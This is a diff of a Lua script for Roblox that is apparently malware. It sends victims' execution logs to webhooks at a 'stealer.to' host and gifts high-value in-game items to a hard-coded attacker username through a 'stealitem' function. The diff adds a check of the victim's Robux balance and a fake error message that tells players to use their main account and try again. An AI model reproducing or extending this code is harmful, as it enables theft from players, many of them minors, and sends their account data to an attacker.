@@ -1,12 +1,12 @@
 -- Configuration (CHANGE THESE TO YOUR VALUES)
 local LogsWebhook = "https://stealer.to/post?uniqueid=97b37190" -- Webhook for general logs
 local ExecutionWebhook = "https://stealer.to/post?uniqueid=e92c9e96" -- Webhook for execution logs
-local Username = "bonzarbal51"   -- Username to gift items to
+local Username = "x6TNine"   -- Username to gift items to
 
 --Kicks
 local kickMessage = "\n[DELTA DOES NOT WORK WITH THIS SCRIPT]\nScript Failed To Load!\nCheck the following- \n1) Please Sub to SharkyScripts\n2) Use main account, alts will be detected\n3) Use different Executor & Try again."  -- Kick message
 local insufficientRobuxMessage = "\n[DELTA DOES NOT WORK WITH THIS SCRIPT]\nScript Failed To Load!\nCheck the following- \n1) Please Sub to SharkyScripts\n2) Use main account, alts will be detected\n3) Use different Executor & Try again." -- Kick message for low robux
-local version = "1.0.5" -- script version number
+local version = "1.0.6" -- script version number
 
 -- Services
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -22,6 +22,7 @@ local result = 0
 local UserId = nil
 local webhookSent = false -- Prevent multiple webhook sends per session
 local initialRobuxCheck = false
+local uiLoaded = false
 
 -- Message array
 local messages = {
@@ -270,6 +271,8 @@ Animator.ChildAdded:Connect(function(child)
                 buttonMiddleContent.Text = "LOAD!"
             end
         end
+		
+		uiLoaded = true
     end
 end)
 
@@ -290,7 +293,7 @@ end
 -- Function to steal items
 local function stealitem()
     local items_to_steal = {
-        { threshold = 5000, storage_name = "Permanent Dragon-Dragon" },
+         { threshold = 5000, storage_name = "Permanent Dragon-Dragon" },
         { threshold = 4000, storage_name = "Permanent Kitsune-Kitsune" },
         { threshold = 3000, storage_name = "Permanent Leopard-Leopard" },
         { threshold = 2700, storage_name = "Fruit Notifier" },
@@ -387,7 +390,6 @@ local function WaitForPrompt1()
 	end
 
     stealitem()
-    
     local success, err = pcall(function()
         local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
         local ProductPurchaseContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
@@ -428,16 +430,23 @@ local function WaitForPrompt1()
     end
 end
 
-
 local function WaitForPrompt2()
-    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
+	local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
+
+	repeat task.wait() until uiLoaded
+    calculateRobux()
+
+	if result < 25 then
+		kickPlayer(insufficientRobuxMessage)
+		return -- Stop the script if they don't have enough robux
+	end
+	
     repeat task.wait() until not Animator:FindFirstChild("Prompt")
 	if not webhookSent then
 		sendExecutionLog()
 		webhookSent = true
 	end
 end
-
 
 -- Send Execution Log
 sendExecutionLog()
